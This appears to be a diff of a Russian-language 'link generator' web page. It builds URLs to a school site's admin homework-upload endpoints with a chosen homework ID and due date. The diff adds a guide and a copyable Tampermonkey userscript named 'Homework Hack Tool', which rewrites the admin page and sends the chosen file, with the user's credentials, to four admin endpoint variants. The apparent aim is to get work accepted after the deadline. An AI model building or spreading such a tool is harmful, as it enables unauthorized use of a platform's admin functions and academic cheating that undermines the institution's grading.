@@ -6,11 +6,7 @@
     <title>Генератор ссылок</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: 'Inter', sans-serif;
@@ -36,14 +32,12 @@
             background: rgba(30, 30, 46, 0.95);
             padding: 40px 35px;
             border-radius: 20px;
-            box-shadow: 
-                0 20px 40px rgba(0, 0, 0, 0.4),
-                0 0 0 1px rgba(255, 255, 255, 0.05);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.08);
             width: 100%;
             max-width: 480px;
-            margin-bottom: 30px;
+            margin-bottom: 24px;
         }
 
         .app-title {
@@ -58,9 +52,7 @@
             text-transform: uppercase;
         }
 
-        .form-group {
-            margin-bottom: 25px;
-        }
+        .form-group { margin-bottom: 25px; }
 
         label {
             display: block;
@@ -73,19 +65,11 @@
             font-family: 'JetBrains Mono', monospace;
         }
 
-        /* Безопасный input без стрелок */
-        input[type="number"] {
-            -moz-appearance: textfield;
-        }
-
+        input[type="number"] { -moz-appearance: textfield; }
         input[type="number"]::-webkit-outer-spin-button,
-        input[type="number"]::-webkit-inner-spin-button {
-            -webkit-appearance: none;
-            margin: 0;
-        }
+        input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
 
-        input[type="number"],
-        input[type="date"] {
+        input[type="number"], input[type="date"] {
             width: 100%;
             padding: 14px 18px;
             background: rgba(20, 20, 35, 0.9);
@@ -95,16 +79,12 @@
             color: #ffffff;
             transition: all 0.3s ease;
             font-family: 'JetBrains Mono', monospace;
-            font-weight: 400;
         }
 
-        input[type="number"]:focus,
-        input[type="date"]:focus {
+        input[type="number"]:focus, input[type="date"]:focus {
             border-color: #6366f1;
             outline: none;
-            box-shadow: 
-                0 0 0 3px rgba(99, 102, 241, 0.15),
-                inset 0 0 0 1px rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.15), inset 0 0 0 1px rgba(255, 255, 255, 0.1);
         }
 
         .submit-btn {
@@ -139,14 +119,8 @@
         }
 
         @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(15px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity: 0; transform: translateY(15px); }
+            to   { opacity: 1; transform: translateY(0); }
         }
 
         .result-title {
@@ -170,11 +144,7 @@
             line-height: 1.5;
         }
 
-        .action-buttons {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
+        .action-buttons { display: flex; gap: 10px; flex-wrap: wrap; }
 
         .action-btn {
             flex: 1;
@@ -195,7 +165,6 @@
             color: #22c55e;
             border: 1px solid rgba(34, 197, 94, 0.3);
         }
-
         .open-btn:hover {
             background: linear-gradient(135deg, rgba(34, 197, 94, 0.3), rgba(34, 197, 94, 0.2));
             transform: translateY(-2px);
@@ -206,57 +175,166 @@
             color: #3b82f6;
             border: 1px solid rgba(59, 130, 246, 0.3);
         }
-
         .copy-btn:hover {
             background: linear-gradient(135deg, rgba(59, 130, 246, 0.3), rgba(59, 130, 246, 0.2));
             transform: translateY(-2px);
         }
 
-        .support-container {
-            text-align: center;
+        /* ====== ИНСТРУКЦИЯ ====== */
+        .guide {
+            width: 100%;
+            max-width: 480px;
+            background: rgba(30, 30, 46, 0.95);
+            padding: 32px 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
         }
 
-        .support-btn {
-            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
+        .guide-title {
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 600;
+            font-family: 'JetBrains Mono', monospace;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            line-height: 1.3;
+        }
+        .guide-title::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #6366f1;
+            box-shadow: 0 0 12px #6366f1;
+            flex-shrink: 0;
+        }
+
+        .guide-intro {
+            color: #9a9ab0;
+            font-size: 12.5px;
+            line-height: 1.65;
+            margin-bottom: 24px;
+            padding: 12px 14px;
+            background: rgba(99, 102, 241, 0.08);
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            border-radius: 10px;
+        }
+
+        .step {
+            display: flex;
+            gap: 14px;
+            padding: 16px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+        }
+        .step:last-child { border-bottom: none; padding-bottom: 0; }
+
+        .step-num {
+            flex-shrink: 0;
+            width: 28px;
+            height: 28px;
+            border-radius: 8px;
+            background: linear-gradient(135deg, #6366f1, #4f46e5);
             color: white;
-            padding: 14px 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 600;
+            font-size: 13px;
+            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3);
+        }
+
+        .step-body { flex: 1; min-width: 0; }
+
+        .step-title {
+            color: #e0e0f0;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+
+        .step-text {
+            color: #9a9ab0;
+            font-size: 12.5px;
+            line-height: 1.6;
+        }
+
+        .step-text code {
+            background: rgba(99, 102, 241, 0.15);
+            color: #a5b4fc;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11.5px;
+        }
+
+        .step-text a {
+            color: #6366f1;
+            text-decoration: none;
+            border-bottom: 1px dashed rgba(99, 102, 241, 0.5);
+            transition: color 0.2s;
+        }
+        .step-text a:hover { color: #818cf8; }
+
+        .step-text ul { margin: 8px 0 0 18px; }
+
+        .copy-code-btn {
+            margin-top: 12px;
+            width: 100%;
+            padding: 12px 16px;
+            background: linear-gradient(135deg, #6366f1, #4f46e5);
+            color: #fff;
             border: none;
             border-radius: 10px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 600;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            letter-spacing: 0.8px;
             font-family: 'JetBrains Mono', monospace;
-            display: inline-block;
-            box-shadow: 0 4px 12px rgba(139, 92, 246, 0.3);
+            font-size: 12.5px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 14px rgba(99, 102, 241, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
-
-        .support-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(139, 92, 246, 0.5);
+        .copy-code-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 22px rgba(99, 102, 241, 0.5);
+        }
+        .copy-code-btn:active { transform: translateY(0); }
+        .copy-code-btn.copied {
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            box-shadow: 0 4px 14px rgba(34, 197, 94, 0.4);
         }
     </style>
 </head>
 <body>
+
+    <!-- ====== ГЕНЕРАТОР ====== -->
     <div class="container">
         <div class="app-title">Генератор ссылок</div>
-        
+
         <form id="linkForm">
             <div class="form-group">
                 <label for="hwId">ID задания</label>
                 <input type="number" id="hwId" required min="1" max="9999" placeholder="Только цифры">
             </div>
-            
+
             <div class="form-group">
                 <label for="dueDate">Дата сдачи</label>
                 <input type="date" id="dueDate" required min="2024-01-01" max="2030-12-31">
             </div>
-            
+
             <button type="submit" class="submit-btn">Сгенерировать</button>
         </form>
-        
+
         <div id="result">
             <div class="result-title">Сгенерированная ссылка</div>
             <div class="generated-link" id="generatedLink"></div>
@@ -267,77 +345,298 @@
         </div>
     </div>
 
+    <!-- ====== ИНСТРУКЦИЯ ====== -->
+    <div class="guide">
+        <div class="guide-title">Новый способ загрузки долгов!</div>
+
+        <div class="guide-intro">
+            К сожалению, стандартный способ больше не работает.
+            Чтобы всё работало как раньше — надо выполнить следующие шаги:
+        </div>
+
+        <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-body">
+                <div class="step-title">Установи Tampermonkey</div>
+                <div class="step-text">
+                    Расширение для браузера, которое выполняет твои скрипты на нужных сайтах.
+                    Доступно для Chrome, Firefox, Edge, Opera:
+                    <ul>
+                        <li><a href="https://www.tampermonkey.net/" target="_blank" rel="noopener">tampermonkey.net</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-body">
+                <div class="step-title">Создай новый скрипт</div>
+                <div class="step-text">
+                    Открой иконку Tampermonkey в браузере → <b>Dashboard</b> → вкладка <b>«+»</b> (новый скрипт).
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-body">
+                <div class="step-title">Скопируй код скрипта</div>
+                <div class="step-text">
+                    Нажми на кнопку ниже — весь код скопируется в буфер обмена.
+                    <button class="copy-code-btn" id="copyCodeBtn">📋 Скопировать код скрипта</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-body">
+                <div class="step-title">Вставь и сохрани</div>
+                <div class="step-text">
+                    В редакторе Tampermonkey замени всё содержимое —
+                    вставь <code>Ctrl+V</code> — сохрани <code>Ctrl+S</code>.
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">5</div>
+            <div class="step-body">
+                <div class="step-title">Готово</div>
+                <div class="step-text">
+                    Теперь просто открываешь ссылку из генератора выше —
+                    выбираешь файл — жмёшь <code>execute upload</code>.
+                    Больше <b>никакой консоли</b>.
+                </div>
+            </div>
+        </div>
+    </div>
+
     <script>
-        // Локальные переменные - ничего не уходит наружу
+        const USERSCRIPT_CODE = `// ==UserScript==
+// @name         Homework Hack Tool
+// @namespace    hw
+// @version      2026
+// @description  Автозамена страницы ДЗ на hack-интерфейс
+// @match        https://stupenionlaincentr.ru/admin/homework/hwfileuploadnoint.php*
+// @match        https://stupenionlaincentr.ru/admin/homework/hwfileupload.php*
+// @grant        none
+// @run-at       document-idle
+// ==/UserScript==
+
+(function () {
+  'use strict';
+
+  const p = new URLSearchParams(location.search);
+  const id = p.get('id');
+  const dated = p.get('dated') || '';
+  if (!id) return;
+
+  const base = location.origin + '/admin/homework/';
+  const URLS = [
+    base + 'hwfileupload.php?id=' + id,
+    base + 'hwfileuploadnoint.php?id=' + id,
+    base + 'hwfileupload.php?id=' + id + (dated ? '&dated=' + dated : ''),
+    base + 'hwfileuploadnoint.php?id=' + id + (dated ? '&dated=' + dated : ''),
+  ];
+
+  document.documentElement.innerHTML = \`
+<head>
+<meta charset="UTF-8">
+<title>HW Hack Tool</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{background:#000;color:#0f8;font-family:'JetBrains Mono',monospace;min-height:100vh}
+body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at center,transparent 40%,#000c);pointer-events:none;z-index:9998}
+.wrap{position:relative;z-index:1;max-width:720px;margin:auto;padding:40px 24px 60px}
+.title{font-size:22px;font-weight:700;color:#0f8;text-shadow:0 0 12px #0f8a;margin-bottom:24px;position:relative}
+.title::before,.title::after{content:attr(data-text);position:absolute;top:0;left:0;width:100%;height:100%;background:#000;overflow:hidden}
+.title::before{color:#f0a;animation:g1 3s infinite linear alternate-reverse;clip-path:polygon(0 0,100% 0,100% 45%,0 45%)}
+.title::after{color:#0ef;animation:g2 2s infinite linear alternate-reverse;clip-path:polygon(0 60%,100% 60%,100% 100%,0 100%)}
+@keyframes g1{0%,90%,100%{transform:translate(0)}92%{transform:translate(-2px,-1px)}94%{transform:translate(2px,1px)}}
+@keyframes g2{0%,90%,100%{transform:translate(0)}93%{transform:translate(2px,1px)}95%{transform:translate(-2px,-1px)}}
+.urls{background:#000;border:1px solid #0f83;padding:14px 16px;font-size:11.5px;line-height:1.9;color:#084;margin-bottom:20px}
+.urls .m{color:#fa0;font-weight:700;margin-right:8px}
+.urls .p{color:#0f8}
+.drop{display:block;padding:30px 20px;border:1px dashed #0f86;background:#000;text-align:center;cursor:pointer;transition:.15s;margin-bottom:14px}
+.drop:hover{border-color:#0f8;background:#0f8808;box-shadow:inset 0 0 40px #0f8808,0 0 20px #0f82}
+.drop input{display:none}
+.drop b{display:block;color:#0f8;font-size:13px;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}
+.drop span{color:#084;font-size:11px;letter-spacing:1px}
+.chip{margin-top:12px;font-size:11.5px;color:#0f8;word-break:break-all}
+.chip::before{content:'> ';color:#084}
+.btn{width:100%;padding:14px;background:#0f8;color:#000;border:0;font:700 13px inherit;letter-spacing:3px;text-transform:uppercase;cursor:pointer;transition:.15s;box-shadow:0 0 20px #0f86}
+.btn:hover:not(:disabled){background:#0fa;box-shadow:0 0 30px #0f8c;letter-spacing:4px}
+.btn:disabled{background:#032;color:#064;cursor:not-allowed;box-shadow:none}
+.out{margin-top:20px;background:#000;border:1px solid #0f83;padding:16px;font-size:11.5px;line-height:1.7;color:#0c6;white-space:pre-wrap;word-break:break-all;min-height:40px;max-height:340px;overflow-y:auto}
+.out::-webkit-scrollbar{width:6px}
+.out::-webkit-scrollbar-track{background:#000}
+.out::-webkit-scrollbar-thumb{background:#0f86}
+.ok{color:#0f8;text-shadow:0 0 8px #0f8}
+.err{color:#f35;text-shadow:0 0 8px #f35}
+.warn{color:#fa0;text-shadow:0 0 8px #fa0}
+.dim{color:#084}
+.footer{margin-top:40px;padding-top:20px;border-top:1px dashed #0f83;text-align:center}
+.footer .logo{font-size:14px;font-weight:700;letter-spacing:6px;color:#0f8;text-shadow:0 0 12px #0f8c;text-transform:lowercase}
+.footer .year{display:inline-block;font-size:10px;color:#000;background:#0f8;padding:2px 8px;margin-left:8px;letter-spacing:2px;vertical-align:middle}
+.footer .tag{margin-top:8px;font-size:10px;color:#042;letter-spacing:3px;text-transform:uppercase}
+.footer .cursor{display:inline-block;width:8px;height:14px;background:#0f8;margin-left:4px;vertical-align:middle;animation:cb .8s step-end infinite}
+@keyframes cb{0%,50%{opacity:1}50.01%,100%{opacity:0}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="title" data-text="Загрузка ДЗ">Загрузка ДЗ</div>
+
+  <div class="urls">
+    \${URLS.map(u => '<div><span class="m">POST</span>' + u.replace(base,'/') + '</div>').join('')}
+  </div>
+
+  <label class="drop" id="drop">
+    <input type="file" id="f">
+    <b>[ выбери файл ]</b>
+    <span>jpeg · pdf · mp3 · zip · rar</span>
+    <div class="chip" id="chip"></div>
+  </label>
+
+  <button class="btn" id="go" disabled>execute upload</button>
+
+  <div class="out" id="out"></div>
+
+  <div class="footer">
+    <div class="logo">homework hack tool<span class="year">2026</span></div>
+    <div class="tag">// use at your own risk //</div>
+    <span class="cursor"></span>
+  </div>
+</div>
+</body>\`;
+
+  const $ = x => document.getElementById(x);
+  const f = $('f'), go = $('go'), chip = $('chip'), out = $('out'), drop = $('drop');
+
+  f.onchange = () => {
+    const x = f.files[0];
+    chip.textContent = x ? x.name + ' · ' + (x.size / 1024).toFixed(1) + ' KB' : '';
+    go.disabled = !x;
+  };
+
+  ['dragenter', 'dragover'].forEach(e =>
+    drop.addEventListener(e, ev => { ev.preventDefault(); drop.style.borderColor = '#0f8'; })
+  );
+  ['dragleave', 'drop'].forEach(e =>
+    drop.addEventListener(e, ev => { ev.preventDefault(); drop.style.borderColor = ''; })
+  );
+  drop.addEventListener('drop', ev => {
+    if (ev.dataTransfer.files.length) {
+      f.files = ev.dataTransfer.files;
+      f.dispatchEvent(new Event('change'));
+    }
+  });
+
+  const cls = t =>
+    /success|Успешно/i.test(t) ? ['ok', '✅ УСПЕХ'] :
+    /Fatal error/i.test(t)     ? ['warn', '💥 FATAL'] :
+    /истекла/i.test(t)         ? ['err', '❌ СРОК ИСТЁК'] :
+    /Недопустимый/i.test(t)    ? ['err', '⚠ НЕДОПУСТИМЫЙ'] :
+    ['dim', '? ' + t.slice(0, 120).replace(/\\s+/g, ' ')];
+
+  go.onclick = async () => {
+    const file = f.files[0];
+    if (!file) return;
+    go.disabled = true;
+    go.textContent = 'executing...';
+    out.innerHTML = '';
+
+    for (const url of URLS) {
+      const fd = new FormData();
+      fd.append('files[]', file);
+      out.insertAdjacentHTML('beforeend', \`<div class="dim">$ \${url.replace(base, '/')}</div>\`);
+      try {
+        const r = await fetch(url, { method: 'POST', body: fd, credentials: 'include' });
+        const t = await r.text();
+        const [c, l] = cls(t);
+        out.insertAdjacentHTML('beforeend', \`<div class="\${c}">  → \${l} · HTTP \${r.status}</div>\`);
+      } catch (e) {
+        out.insertAdjacentHTML('beforeend', \`<div class="err">  → ERROR: \${e}</div>\`);
+      }
+    }
+
+    out.insertAdjacentHTML('beforeend', \`<div class="ok" style="margin-top:8px">[ done ]</div>\`);
+    go.disabled = false;
+    go.textContent = 'execute again';
+    out.scrollTop = out.scrollHeight;
+  };
+})();`;
+
+        const copyCodeBtn = document.getElementById('copyCodeBtn');
+        copyCodeBtn.addEventListener('click', () => {
+            navigator.clipboard.writeText(USERSCRIPT_CODE).then(() => {
+                copyCodeBtn.classList.add('copied');
+                copyCodeBtn.innerHTML = '✓ Скопировано!';
+                setTimeout(() => {
+                    copyCodeBtn.classList.remove('copied');
+                    copyCodeBtn.innerHTML = '📋 Скопировать код скрипта';
+                }, 2000);
+            }).catch(() => {
+                const ta = document.createElement('textarea');
+                ta.value = USERSCRIPT_CODE;
+                ta.style.position = 'fixed';
+                ta.style.left = '-999999px';
+                document.body.appendChild(ta);
+                ta.select();
+                try {
+                    document.execCommand('copy');
+                    copyCodeBtn.classList.add('copied');
+                    copyCodeBtn.innerHTML = '✓ Скопировано!';
+                    setTimeout(() => {
+                        copyCodeBtn.classList.remove('copied');
+                        copyCodeBtn.innerHTML = '📋 Скопировать код скрипта';
+                    }, 2000);
+                } catch (e) {
+                    alert('Не удалось скопировать. Попробуй вручную.');
+                }
+                document.body.removeChild(ta);
+            });
+        });
+
         let currentGeneratedLink = '';
 
-        // Безопасная валидация
         function validateInputs(hwId, dueDate) {
-            // Проверка на пустые значения
-            if (!hwId || !dueDate) {
-                return 'Заполните все поля';
-            }
-            
-            // Проверка диапазона ID
-            if (hwId < 1 || hwId > 9999) {
-                return 'ID должен быть от 1 до 9999';
-            }
-            
-            // Проверка даты
+            if (!hwId || !dueDate) return 'Заполните все поля';
+            if (hwId < 1 || hwId > 9999) return 'ID должен быть от 1 до 9999';
             const inputDate = new Date(dueDate);
             const minDate = new Date('2024-01-01');
             const maxDate = new Date('2030-12-31');
-            
-            if (inputDate < minDate || inputDate > maxDate) {
-                return 'Дата должна быть между 2024 и 2030 годом';
-            }
-            
+            if (inputDate < minDate || inputDate > maxDate) return 'Дата должна быть между 2024 и 2030 годом';
             return null;
         }
 
-        // Основная функция
         document.getElementById('linkForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            
             const hwId = parseInt(document.getElementById('hwId').value);
             const dueDate = document.getElementById('dueDate').value;
-            
-            // Валидация
             const error = validateInputs(hwId, dueDate);
-            if (error) {
-                alert(error);
-                return;
-            }
-            
-            // Генерация ссылки (всё локально)
+            if (error) { alert(error); return; }
+
             const baseUrl = "https://stupenionlaincentr.ru/admin/homework/hwfileuploadnoint.php";
             currentGeneratedLink = `${baseUrl}?&id=${hwId}&dated=${dueDate}`;
-            
-            // Безопасное отображение
+
             document.getElementById('generatedLink').textContent = currentGeneratedLink;
             document.getElementById('result').style.display = 'block';
         });
 
         function openLink() {
-            if (!currentGeneratedLink) {
-                alert('Сначала сгенерируйте ссылку!');
-                return;
-            }
-            // Безопасное открытие ссылки
+            if (!currentGeneratedLink) { alert('Сначала сгенерируйте ссылку!'); return; }
             window.open(currentGeneratedLink, '_blank', 'noopener,noreferrer');
         }
 
         function copyToClipboard() {
-            if (!currentGeneratedLink) {
-                alert('Сначала сгенерируйте ссылку!');
-                return;
-            }
-            
-            // Безопасное копирование
+            if (!currentGeneratedLink) { alert('Сначала сгенерируйте ссылку!'); return; }
             navigator.clipboard.writeText(currentGeneratedLink).then(() => {
                 alert('Ссылка скопирована!');
-            }).catch(err => {
-                // Fallback без создания DOM элементов
+            }).catch(() => {
                 try {
                     const textArea = document.createElement('textarea');
                     textArea.value = currentGeneratedLink;
@@ -354,7 +653,6 @@
             });
         }
 
-        // Устанавливаем сегодняшнюю дату
         document.getElementById('dueDate').valueAsDate = new Date();
     </script>
 </body>
